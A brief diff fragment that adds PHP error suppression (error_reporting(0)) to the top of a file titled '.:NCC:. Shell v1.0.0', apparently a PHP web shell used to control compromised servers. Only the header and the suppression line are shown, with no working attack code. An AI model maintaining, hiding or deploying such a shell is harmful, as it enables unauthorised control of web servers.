@@ -1,3 +1,6 @@
+<?php
+error_reporting(0);
+?>
 <center>
 <h1>.:NCC:. Shell v1.0.0</h1>
 <title>.:NCC:. Shell v1.0.0</title>
